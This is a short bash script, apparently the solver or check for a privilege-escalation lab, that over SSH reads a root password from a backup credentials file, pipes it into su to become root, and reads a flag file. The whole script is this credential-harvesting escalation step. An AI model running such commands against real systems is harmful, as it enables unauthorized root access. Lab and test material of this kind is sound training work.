#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'pass=$(grep root_password= /var/backups/credentials.txt | cut -d= -f2); echo "$pass" | su - root -c "cat /root/flag.txt" 2>/dev/null')"
assert_root_output "${out}"
